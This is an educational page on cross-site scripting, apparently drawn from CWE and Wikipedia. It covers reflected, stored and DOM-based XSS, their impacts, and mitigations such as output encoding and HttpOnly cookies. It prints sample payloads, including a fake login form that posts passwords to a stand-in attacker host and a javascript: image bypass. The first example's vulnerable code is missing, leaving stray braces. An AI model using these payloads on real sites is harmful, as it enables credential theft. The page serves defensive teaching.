    <h4>Description</h4>
<p>The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users. XSS is mainly classified into 3 types: reflected XSS, persistent XSS and DOM-based XSS.</p>
<h5>Reflected</h5>
<p>The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.</p>
<h5>Persistent</h5>
<p>The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.</p>
<h5>DOM-based</h5>
<p>In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.</p>
<h4>Vulnerability and risk[^cwe]</h4>
<p>The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact.</p>
<p>Scope | Impact | Likelihood
--- | --- | ---
Access Control Confidentiality | The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also. |
Integrity Confidentiality Availability | In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws. |
Confidentiality Integrity Availability Access Control | The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running &quot;Active X&quot; controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content. |</p>

<h4>Demonstrative Examples</h4>
<h5>Example 1</h5>
<p>This code displays a welcome message on a web page based on the HTTP GET <code>msg</code> parameter. This example covers a Reflected XSS scenario.</p>

  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>Because the parameter can be arbitrary, the url of the page could be modified so <code>msg</code> contains scripting syntax, such as</p>
<div class="highlight"><pre><span></span>http://trusted.sbrella.in/echo?msg=<span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&quot;javascript&quot;</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;You&#39;ve been attacked!&quot;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</pre></div>
<p>This results in a harmless alert dialogue popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.
More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:</p>
<div class="highlight"><pre><span></span>http://trusted.sbrella.in/echo?msg=<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;stealpassword&quot;</span><span class="p">&gt;</span>Please Login:<span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;input&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;http://attack.sbrella.in/stealpassword&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span><span class="p">&gt;</span>Username: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>Password: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;password&quot;</span> <span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Login&quot;</span> <span class="p">/&gt;&lt;/</span><span class="nt">form</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>

</pre></div>
<p>The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Users page. This HTML can, for example, be a password stealing Login message.</p>
<h4>Potential Mitigations</h4>
<h5>Vetted library or framework[^cwe]</h5>
<p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Examples of libraries and frameworks that make it easier to generate properly encoded output include <a href="https://www.microsoft.com/en-us/download/details.aspx?id=43126">Microsoft's Anti-XSS library</a>, the <a href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/2.1.0.1">OWASP ESAPI</a>, and <a href="https://wicket.apache.org/">Apache Wicket</a>.</p>
<h5>Contextual output encoding/escaping of string input[^wikipedia]</h5>
<p>Contextual output encoding/escaping could be used as the primary defense mechanism to stop XSS attacks. There are several escaping schemes that can be used depending on where the untrusted string needs to be placed within an HTML document including HTML entity encoding, JavaScript escaping, CSS escaping, and URL (or percent) encoding. Most web applications that do not need to accept rich data can use escaping to largely eliminate the risk of XSS attacks in a fairly straightforward manner.
Although widely recommended, performing HTML entity encoding only on the five XML significant characters is not always sufficient to prevent many forms of XSS attacks. As encoding is often difficult, security encoding libraries are usually easier to use.</p>
<h5>Safely validating untrusted HTML input[^wikipedia]</h5>
<p>Many operators of particular web applications (e.g. forums and webmail) allow users to utilize a limited subset of HTML markup. When accepting HTML input from users (say, <code>&lt;b&gt;very&lt;/b&gt; large</code>), output encoding (such as <code>&lt;b&lt;very&lt;/b&lt; large</code>) will not suffice since the user input needs to be rendered as HTML by the browser (so it shows as <code>very large</code>, instead of <code>&lt;b&gt;very&lt;/b&gt; large</code>). Stopping an XSS attack when accepting HTML input from users is much more complex in this situation. Untrusted HTML input must be run through an HTML sanitization engine to ensure that it does not contain XSS code.
It should also be noted that many validations rely on parsing out (blacklisting) specific &quot;at risk&quot; html tags such as the following</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="err"> &lt;link&gt; &lt;iframe&gt;</span>
</pre></div>
<p>There are several issues with this approach, for example sometimes seemingly harmless tags can be left out which when utilized correctly can still result in an XSS. See below</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>
</pre></div>
<p>Another popular method is to strip user input of &quot; and ' however this can also be bypassed as the payload can be concealed with Obfuscation.</p>
<h5>Separate data and code[^cwe]</h5>
<p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</p>
<h5>Set the session cookie to be HttpOnly[^cwe][^http-only]</h5>
<p>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use <code>document.cookie</code>. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, <code>XMLHTTPRequest</code> and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</p>
<h5>Disable scripts[^wikipedia]</h5>
<p>While Web 2.0 and Ajax developers require the use of JavaScript, some web applications are written to allow operation without the need for any client-side scripts. This allows users, if they choose, to disable scripting in their browsers before using the application. In this way, even potentially malicious client-side scripts could be inserted unescaped on a page, and users would not be susceptible to XSS attacks.</p>
<h5>Cookie protection[^wikipedia]</h5>
<p>Besides content filtering, other imperfect methods for cross-site scripting mitigation are also commonly used. One example is the use of additional security controls when handling cookie-based user authentication. Many web applications rely on session cookies for authentication between individual HTTP requests, and because client-side scripts generally have access to these cookies, simple XSS exploits can steal these cookies. To mitigate this particular threat (though not the XSS problem in general), many web applications tie session cookies to the IP address of the user who originally logged in, then only permit that IP to use that cookie. This is effective in most situations (if an attacker is only after the cookie), but obviously breaks down in situations where an attacker is behind the same NATed IP address or web proxy as the victim, or the victim is changing his or her mobile IP.</p>
